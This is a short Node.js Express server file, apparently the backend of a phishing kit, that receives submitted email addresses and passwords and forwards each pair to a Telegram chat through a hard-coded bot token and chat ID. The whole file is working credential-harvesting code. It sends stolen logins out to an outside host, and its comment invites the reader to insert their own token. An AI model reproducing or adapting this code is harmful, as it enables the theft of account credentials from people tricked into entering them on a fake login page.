// api/submit.js
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Replace with your Telegram bot token and chat ID
const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE'; // Bot Token
const chatId = '7587120060'; // Chat ID

// Handle POST request
app.post('/api/submit', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password required' });
    }

    const message = `🚨 New Login Attempt 🚨\n\nEmail: ${email}\nPassword: ${password}`;

    await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: message
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error.message);
    return res.status(500).json({ error: 'Failed to send credentials' });
  }
});

module.exports = app;
